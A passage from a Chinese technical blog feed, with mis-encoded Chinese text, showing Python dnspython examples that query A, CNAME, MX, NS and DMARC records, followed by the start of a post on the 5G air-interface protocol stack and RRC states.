punctuation">.</span>NoAnswer<span class="token punctuation">:</span>   XXXX</code></pre></div><h2 id="è§£æ-Aè®°å½•">è§£æ Aè®°å½•</h2><div class="story post-story"><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''å¦‚æœä¸çŸ¥é“è¿”å›çš„Re ç»“æœæ€ä¹ˆå–å€¼ï¼Œ å¯ä»¥é€šè¿‡ print(re.__dict__) æŸ¥çœ‹è¿”å›ç»“æœçš„å†…ç½®å¯¹è±¡æˆ–è€…print(dir(re))'''</span><span class="token keyword">import</span> dns<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    re <span class="token operator">=</span> dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"www.bai.com"</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>rrset<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>response<span class="token punctuation">.</span>answer<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>items<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''output:&#123;'qname': &lt;DNS name baidu.com.>, 'rdtype': 1, 'rdclass': 1, 'response': &lt;DNS message, ID 22745>, 'canonical_name': &lt;DNS name baidu.com.>, 'rrset': &lt;DNS baidu.com. IN A RRset>, 'expiration': 1637812232.3766685&#125;---------------------åä¸½çš„åˆ†å‰²çº¿1----------------------220.181.38.148220.181.38.251---------------------åä¸½çš„åˆ†å‰²çº¿2----------------------220.181.38.148220.181.38.251'''</span></code></pre></div><h2 id="è§£æ-CNAMEè®°å½•">è§£æ CNAMEè®°å½•</h2><div class="story post-story"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dns<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    re <span class="token operator">=</span> dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"www.baidu.com"</span><span class="token punctuation">,</span><span class="token string">'CNAME'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>rrset<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>response<span class="token punctuation">.</span>answer<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>items<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''output: &#123;'qname': &lt;DNS name www.baidu.com.>, 'rdtype': 5, 'rdclass': 1, 'response': &lt;DNS message, ID 21322>, 'canonical_name': &lt;DNS name www.baidu.com.>, 'rrset': &lt;DNS www.baidu.com. IN CNAME RRset>, 'expiration': 1637813064.512025&#125;---------------------åä¸½çš„åˆ†å‰²çº¿1----------------------www.a.shifen.com.---------------------åä¸½çš„åˆ†å‰²çº¿2----------------------www.a.shifen.com.---------------------åä¸½çš„åˆ†å‰²çº¿3----------------------www.a.shifen.com.'''</span></code></pre></div><h2 id="è§£æ-MXè®°å½•">è§£æ MXè®°å½•</h2><div class="story post-story"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dns<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    re <span class="token operator">=</span> dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"baidu.com"</span><span class="token punctuation">,</span><span class="token string">"MX"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>rrset<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>response<span class="token punctuation">.</span>answer<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>items<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'MX preference ='</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>preference<span class="token punctuation">,</span> <span class="token string">'mail exchanger ='</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>exchange<span class="token punctuation">)</span>        <span class="token triple-quoted-string string">'''output:&#123;'qname': &lt;DNS name baidu.com.>, 'rdtype': 15, 'rdclass': 1, 'response': &lt;DNS message, ID 47237>, 'canonical_name': &lt;DNS name baidu.com.>, 'rrset': &lt;DNS baidu.com. IN MX RRset>, 'expiration': 1637817511.307147&#125;---------------------åä¸½çš„åˆ†å‰²çº¿1----------------------20 mx1.baidu.com.15 mx.n.shifen.com.20 mx50.baidu.com.20 usmx01.baidu.com.20 jpmx.baidu.com.10 mx.maillb.baidu.com.---------------------åä¸½çš„åˆ†å‰²çº¿2----------------------20 mx1.baidu.com.15 mx.n.shifen.com.20 mx50.baidu.com.20 usmx01.baidu.com.20 jpmx.baidu.com.10 mx.maillb.baidu.com.---------------------åä¸½çš„åˆ†å‰²çº¿3----------------------MX preference = 20 mail exchanger = mx1.baidu.com.MX preference = 15 mail exchanger = mx.n.shifen.com.MX preference = 20 mail exchanger = mx50.baidu.com.MX preference = 20 mail exchanger = usmx01.baidu.com.MX preference = 20 mail exchanger = jpmx.baidu.com.MX preference = 10 mail exchanger = mx.maillb.baidu.com.'''</span></code></pre></div><h2 id="è§£æ-NSè®°å½•">è§£æ NSè®°å½•</h2><div class="story post-story"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dns<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    re <span class="token operator">=</span> dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"baidu.com"</span><span class="token punctuation">,</span><span class="token string">"NS"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>rrset<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>response<span class="token punctuation">.</span>answer<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>items<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''output:&#123;'qname': &lt;DNS name baidu.com.>, 'rdtype': 2, 'rdclass': 1, 'response': &lt;DNS message, ID 64405>, 'canonical_name': &lt;DNS name baidu.com.>, 'rrset': &lt;DNS baidu.com. IN NS RRset>, 'expiration': 1637815874.9459918&#125;---------------------åä¸½çš„åˆ†å‰²çº¿1----------------------dns.baidu.com.ns4.baidu.com.ns3.baidu.com.ns7.baidu.com.ns2.baidu.com.---------------------åä¸½çš„åˆ†å‰²çº¿2----------------------dns.baidu.com.ns4.baidu.com.ns3.baidu.com.ns7.baidu.com.ns2.baidu.com.---------------------åä¸½çš„åˆ†å‰²çº¿3----------------------dns.baidu.com.ns4.baidu.com.ns3.baidu.com.ns7.baidu.com.ns2.baidu.com.Process finished with exit code 0'''</span></code></pre></div><h2 id="è§£æ-DMARC-è®°å½•">è§£æ DMARC è®°å½•</h2><div class="story post-story"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> dns<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    re <span class="token operator">=</span> dns<span class="token punctuation">.</span>resolver<span class="token punctuation">.</span>query<span class="token punctuation">(</span><span class="token string">"_dmarc."</span><span class="token operator">+</span><span class="token string">"google.com"</span><span class="token punctuation">,</span><span class="token string">"TXT"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>rrset<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">.</span>response<span class="token punctuation">.</span>answer<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">.</span>items<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;:-^50s&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"åä¸½çš„åˆ†å‰²çº¿3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> re<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>to_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token triple-quoted-string string">'''output:---------------------åä¸½çš„åˆ†å‰²çº¿1----------------------v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com---------------------åä¸½çš„åˆ†å‰²çº¿2----------------------"v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com"---------------------åä¸½çš„åˆ†å‰²çº¿3----------------------"v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com"'''</span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5Gç©ºå£åè®®æ ˆ</title>
      <link href="/posts/f5bfc31f/"/>
      <url>/posts/f5bfc31f/</url>
      
        <content type="html"><![CDATA[<h1>5G ç©ºå£åè®®æ ˆ</h1><blockquote><p>create date: 2021-10-28 09:03:43</p></blockquote><p>[TOC]</p><h2 id="ä¸€ã€ç©ºå£åè®®æ ˆæ¦‚è¿°">ä¸€ã€ç©ºå£åè®®æ ˆæ¦‚è¿°</h2><div class="story post-story"><h3 id="ï¼ˆä¸€ï¼‰ã€æ§åˆ¶é¢">ï¼ˆä¸€ï¼‰ã€æ§åˆ¶é¢</h3><img src="https://i.loli.net/2021/11/14/v8Vk4gK6bxQmC2G.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/v8Vk4gK6bxQmC2G.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>â— å±‚ä¸‰</p><ul><li>NASï¼šä¼šè¯ç®¡ç†ã€ç”¨æˆ·ç®¡ç†ã€å®‰å…¨ç®¡ç†ã€è®¡è´¹ã€‚</li><li>RRCï¼šç³»ç»Ÿæ¶ˆæ¯ã€å‡†å…¥æ§åˆ¶ã€å®‰å…¨ç®¡ç†ã€æµ‹é‡ä¸ä¸ŠæŠ¥ã€åˆ‡æ¢å’Œç§»åŠ¨æ€§ã€NASæ¶ˆæ¯ä¼ è¾“ã€æ— çº¿èµ„æºç®¡ç†ã€‚</li></ul><p>â— å±‚äºŒ</p><p>å¯¹ä¸åŒçš„å±‚ä¸‰æ•°æ®è¿›è¡ŒåŒºåˆ†æ ‡è¯†ï¼Œå¹¶æä¾›ä¸åŒçš„æœåŠ¡</p><ul><li>PDCPï¼ˆåˆ†ç»„æ•°æ®æ±‡èšåè®®å±‚ï¼‰ï¼šä¼ è¾“ç”¨æˆ·é¢å’Œæ§åˆ¶é¢æ•°æ®ã€ç»´æŠ¤PDCPçš„SNå·ã€è·¯ç”±å’Œé‡å¤ï¼ˆåŒè¿æ¥åœºæ™¯ï¼‰ã€åŠ å¯†/è§£å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ã€é‡æ’åºã€æ”¯æŒä¹±åºé€’äº¤ã€ é‡å¤ä¸¢å¼ƒã€ROHCï¼ˆç”¨æˆ·é¢ï¼‰ã€‚</li><li>RLCï¼ˆæ— çº¿é“¾è·¯æ§åˆ¶å±‚ï¼‰ï¼šæ£€é”™ã€çº é”™ARQï¼ˆAMå®ä½“ï¼‰ï¼›åˆ†æ®µé‡ç»„ï¼ˆUMå®ä½“å’ŒAMå®ä½“ï¼‰ï¼›é‡åˆ†æ®µï¼ˆAMå®ä½“ï¼‰ï¼›é‡å¤åŒ…æ£€æµ‹ï¼ˆAMå®ä½“ï¼‰ã€‚</li><li>MACï¼ˆåª’ä½“æ¥å…¥å±‚ï¼‰ï¼šé€»è¾‘ä¿¡é“å’Œä¼ è¾“ä¿¡é“ä¹‹é—´çš„æ˜ å°„ã€å¤ç”¨/è§£å¤ç”¨ã€è°ƒåº¦ã€HARQã€é€»è¾‘ä¿¡é“ä¼˜å…ˆçº§è®¾ç½®ã€‚</li></ul><p>â— å±‚ä¸€</p><p>ç‰©ç†å±‚ä¸ºé«˜å±‚çš„æ•°æ®æä¾›æ— çº¿èµ„æºåŠç‰©ç†å±‚çš„å¤„ç†</p><p>PHYï¼ˆç‰©ç†å±‚ï¼‰</p><ul><li>åœºæ™¯ç¼–ç ï¼šæ§åˆ¶ä¿¡é“Polarç ï¼Œä¸šåŠ¡ä¿¡é“LDPCç ï¼›</li><li>è°ƒåˆ¶ï¼šQPSKã€16QAMã€64QAMã€256QAMï¼›</li><li>massiveMIMOï¼š<a href="https://zhuanlan.zhihu.com/p/338056199">è¯¦è§ç¬¬1éƒ¨åˆ†-massiveMIMOæ¦‚è¿°</a></li></ul><h3 id="ï¼ˆäºŒï¼‰ã€ç”¨æˆ·é¢">ï¼ˆäºŒï¼‰ã€ç”¨æˆ·é¢</h3><img src="https://i.loli.net/2021/11/14/Sf9GlDs8tdOxk1B.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/Sf9GlDs8tdOxk1B.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>â— å±‚äºŒå¢åŠ SDAPå±‚(<code>Service Data Adaptation Protocol</code>,æœåŠ¡æ•°æ®é€‚é…åè®®)</p><p>åœ¨SAç»„ç½‘ä¸‹ï¼Œ4Gç½‘ç»œä¸­çš„æ— çº¿æ‰¿è½½çš„æ¦‚å¿µä¾ç„¶è¢«æ²¿ç”¨ï¼Œä½†5Gæ ¸å¿ƒç½‘ä¸ºäº†ä½¿ä¸šåŠ¡å®ç°æ›´åŠ çš„ç²¾ç»†åŒ–ï¼Œ5Gçš„åŸºæœ¬ä¸šåŠ¡çš„ä¼ è¾“å•ä½ä»4Gæ—¶ä»£æ‰¿è½½çš„æ¦‚å¿µç»†åŒ–åˆ°ä»¥QoS Flowã€‚SDAPåè®®æ ˆåŠŸèƒ½å°±æ˜¯å®Œæˆæ— çº¿ä¾§çš„æ‰¿è½½ï¼ˆDRBï¼‰ä¸5GCä¸­çš„QoSFlowè¿›è¡Œæ˜ å°„</p></div><h2 id="äºŒã€RRCå±‚åŠŸèƒ½ä»‹ç»">äºŒã€RRCå±‚åŠŸèƒ½ä»‹ç»</h2><div class="story post-story"><img src="https://i.loli.net/2021/11/14/vIaCKckrW4Zpqyi.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/vIaCKckrW4Zpqyi.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>RRCï¼ˆ<code>Radio Resource Control</code>ï¼Œæ— çº¿èµ„æºæ§åˆ¶ï¼‰å±‚ï¼Œæ˜¯æ•´ä¸ªæ— çº¿é€šä¿¡åè®®æ ˆæ¥å…¥å±‚çš„æ¶ˆæ¯é…ç½®ä¸­å¿ƒåŠæ§åˆ¶ä¸­å¿ƒï¼Œå…¶é‡è¦æ€§ä¸è¨€è€Œå–»ã€‚RRCå±‚çš„ä¸»è¦ä½œç”¨æ˜¯ç»™å…¶ä¸‹å±‚ï¼ˆ<code>PDCP</code>,<code>RLC</code>,<code>MAC</code>,<code>PHY</code>ï¼‰æ§åˆ¶å’Œé…ç½®æ‰€æœ‰æ— çº¿èµ„æºï¼Œä»è€Œå¯ä»¥ä½¿UEä¸åŸºç«™ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚</p><h3 id="ï¼ˆä¸€ï¼‰ã€åŠŸèƒ½">ï¼ˆä¸€ï¼‰ã€åŠŸèƒ½</h3><img src="https://i.loli.net/2021/11/14/VdlWJ3C6aovZhuG.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/VdlWJ3C6aovZhuG.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>RRCå±‚ä½äºPDCPå±‚ä¹‹ä¸Šï¼ŒåŠŸèƒ½å’ŒLTEåŸºæœ¬ä¸€è‡´</p><ul><li>ç³»ç»Ÿæ¶ˆæ¯</li><li>å‡†å…¥æ§åˆ¶</li><li>å®‰å…¨ç®¡ç†</li><li>æµ‹é‡ä¸ä¸ŠæŠ¥</li><li>åˆ‡æ¢å’Œç§»åŠ¨æ€§</li><li>NASæ¶ˆæ¯ä¼ è¾“</li><li>æ— é™èµ„æºç®¡ç†</li></ul><h3 id="ï¼ˆäºŒï¼‰ã€RRCçŠ¶æ€">ï¼ˆäºŒï¼‰ã€RRCçŠ¶æ€</h3><p>â— Connected/IDEL</p><img src="https://i.loli.net/2021/11/14/2AmGX4f5qJuVngH.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/2AmGX4f5qJuVngH.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>LTEæ—¶ä»…æœ‰è¿™ä¸¤ä¸ªçŠ¶æ€ï¼Œç”¨æˆ·è¦ä¼ æ•°æ®å¿…é¡»åœ¨<code>RRC_C0NNECTED</code>çŠ¶æ€ï¼Œå› ä¸ºè¯¥çŠ¶æ€ä¸‹å„ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„é€šé“éƒ½éœ€è¦æ‰“é€šï¼›IDELçŠ¶æ€æ˜¯ä¸åŸºç«™çš„èµ„æºï¼ˆDRBæ‰¿è½½ã€S1æ‰¿è½½ï¼‰éƒ½è¦é‡Šæ”¾ï¼Œè€Œæ ¸å¿ƒç½‘èµ„æºä¿ç•™ã€‚ä¸¤ç§çŠ¶æ€é€šè¿‡å¯»å‘¼å’ŒRRCé‡Šæ”¾è½¬æ¢ã€‚5Gä¸¤ç§çŠ¶æ€ä¸LTEä¸€è‡´ã€‚</p><p>â— Inactive</p><p>ç›¸å¯¹äºLTEï¼ŒNRæ–°å¢äº†InactiveçŠ¶æ€ã€‚åœ¨è¯¥çŠ¶æ€ä¸‹UEå­˜å‚¨ASä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œç›‘å¬å¯»å‘¼ä»¥åŠæ‰§è¡Œå°åŒºé‡é€‰æµç¨‹ã€‚åœ¨RRC InactiveçŠ¶æ€ä¸‹ï¼ŒUEå’ŒgNBåªä¼šç»´æŒRRCå’ŒPDCPå±‚çš„é“¾æ¥ï¼ŒgNBå’ŒUEä¼šé‡Šæ”¾C-RNTIä¸Šä¸‹æ–‡ï¼›ä¸ºäº†æ ‡è¯†ç”¨æˆ·ï¼ŒgNBå’ŒUEä¾§ä¼šæ–°å»ºç«‹I-RNTIç”¨äºç”¨æˆ·çš„æ ‡è¯†ã€‚ä»…é‡Šæ”¾ç©ºå£èµ„æºï¼Œç®€åŒ–äº†RRCçŠ¶æ€è½¬æ¢çš„æµç¨‹ï¼ŒèŠ‚çœäº†ç”¨æˆ·è¿”å›é“¾æ¥æ€çš„æ—¶å»¶ï¼Œå‡å°‘äº†ä¿¡ä»¤å¼€é”€ï¼Œä½†ç°ç½‘å°šæœªå¯ç”¨ã€‚</p><h3 id="ï¼ˆä¸‰ï¼‰ã€å®šä¹‰RNAï¼ˆRAN-Based-Notification-Areaï¼‰">ï¼ˆä¸‰ï¼‰ã€å®šä¹‰RNAï¼ˆRAN-Based Notification Areaï¼‰</h3><p>RNAå¯ä»¥è¦†ç›–ä¸€ä¸ªåŸºç«™æˆ–è€…å¤šä¸ªåŸºç«™ï¼Œä½†ä¸€å®šè¦åœ¨æ ¸å¿ƒç½‘é…ç½®çš„æ³¨å†ŒåŒºèŒƒå›´å†… å½“UEçš„RNAå®šæ—¶å™¨è¶…æ—¶æˆ–è€…UEç§»åŠ¨å‡ºäº†RNAèŒƒå›´æ—¶ï¼ŒUEéƒ½è¦å‘èµ·RANUï¼ˆRAN-based notification area updateï¼‰æµç¨‹</p><p>å…³äºå¦‚ä½•é…ç½®RNAæœ‰å‡ ç§ä¸åŒçš„é€‰æ‹©ï¼š</p><ol><li>-å°åŒºåˆ—è¡¨ï¼š<ol><li>â€“gNBç»™UEæä¾›ä¸€ä¸ªæ˜ç¡®çš„å°åŒºåˆ—è¡¨ä½œä¸ºRNAã€‚</li></ol></li><li>-RAN areaåˆ—è¡¨ï¼š<ol><li>â€“gNBç»™UEæä¾›ä¸€ä¸ªRAN area IDåˆ—è¡¨ä½œä¸ºRNAï¼Œè¿™é‡Œæä¾›çš„RAN areaæ˜¯CN Tracking Areaçš„ä¸€ä¸ªå­é›†æˆ–è€…ç­‰äºCN Tracking Areaï¼Œä¸€ä¸ªRAN areaå¯¹åº”ä¸€ä¸ªRAN area IDï¼Œä¸€ä¸ªRAN areaç”±TAIå’Œä¸€ä¸ªå¯é€‰çš„RAN area Codeç»„æˆã€‚</li><li>â€“ä¸€ä¸ªå°åŒºä¼šåœ¨å…¶ç³»ç»Ÿæ¶ˆæ¯å¹¿æ’­å®ƒçš„RAN area IDã€‚ å‚è€ƒï¼š<strong>TS23.501ã€TS38.413</strong></li></ol></li></ol><p>â— å½“UEå¤„äºRRC_INACTIVEæ—¶ï¼Œå¦‚æœæœ€åä¸€ä¸ªæœåŠ¡gNBæ”¶åˆ°æ¥è‡ªUPFçš„ä¸‹è¡Œæ•°æ®æˆ–è€…æ¥è‡ªAMFçš„ä¸‹è¡Œä¿¡ä»¤ï¼Œåˆ™è¯¥gNBåœ¨RNAçš„æ‰€æœ‰å°åŒºå¯»å‘¼UEï¼Œå¦‚æœRNAçš„å°åŒºå±äºé‚»gNBçš„ï¼Œåˆ™é€šè¿‡Xnå£ç»™å¯¹åº”çš„é‚»gNBå‘é€<code>XnAP-RAN-Paging</code>æ¶ˆæ¯ã€‚å¦‚æœRANå¯»å‘¼å¤±è´¥ï¼Œåˆ™ã€è§äºTS23.501 5.3.3.2.5ã€‘ï¼š</p><ul><li>å¦‚æœNG-RANæœ‰NAS PDUè¦å‘ç»™UEï¼Œåˆ™RANèŠ‚ç‚¹åº”è¯¥å‘èµ·AN 